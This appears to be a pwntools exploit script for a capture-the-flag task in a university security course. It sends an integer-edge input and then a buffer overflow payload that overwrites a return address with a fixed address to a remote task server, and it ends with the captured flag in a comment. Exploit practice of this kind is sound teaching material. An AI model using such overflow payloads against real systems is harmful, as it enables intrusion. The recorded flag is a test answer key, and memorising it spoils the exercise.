from pwn import *
import string
from sys import argv
import os
import time
import subprocess

context.arch = 'amd64'
context.os = 'linux'
info = log.info
#context.log_level = 'debug'

elf = context.binary = ELF('vuln')


# for debugging
gdbscript = '''
file vuln
#b *(main)
b *(measure_power_level+48)
'''.format(**locals())
#p = gdb.debug(["./vuln"], gdbscript=gdbscript, )
with open("gdbscript", "w") as f:
    f.write(gdbscript)


#p=remote("127.0.0.1", 1024)
#
#p2=process('tmux split-window -h gdb -x gdbscript -p $(pgrep -n vuln)', shell=True)
sleep(1)

# start remote
p = remote('tasks.ws24.softsec.rub.de', 33255)


p.sendline(b"-2147483648")


p.sendline(b"A"*(cyclic_find(b"aaae")-1)+p64(0x401176))

# see outputted flag
p.interactive()

#softsec{pRTftblPmjhnHayiQB50-yYziJMd25zSfL-KI8tAoZwmVAaAo-tGyk6ewlHvCUpt}